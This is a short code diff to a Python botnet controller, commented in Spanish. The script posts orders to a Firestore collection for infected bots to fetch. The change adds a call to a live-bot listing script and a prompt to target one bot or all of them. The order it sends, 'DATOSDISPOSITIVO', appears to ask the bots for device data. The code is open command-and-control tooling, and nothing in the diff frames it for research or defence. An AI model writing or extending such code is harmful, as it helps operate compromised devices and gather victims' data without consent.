@@ -1,3 +1,4 @@
+import os
 import firebase_admin
 from firebase_admin import credentials, firestore# initialize sdk
 from datetime import datetime
@@ -12,4 +13,9 @@ now = datetime.now()
 dt_string = now.strftime("%d-%m-%Y %H:%M:%S")
 
 # Escribe una orden para la botnet
-firestore_db.collection(u'ordenes').document('datosDispositivo ' + dt_string).set({'Primitiva': 'DATOSDISPOSITIVO'})
+# Escribe una orden para la botnet
+os.system("python3 botsVivos.py")
+botEscogido = input("Select a bot or leave empty to set a permanent order: ")
+if(botEscogido == ""):
+    botEscogido = 'todos'
+firestore_db.collection(u'ordenes').document('datosDispositivo ' + dt_string).set({'Primitiva': 'DATOSDISPOSITIVO', 'Bot_ID': botEscogido})
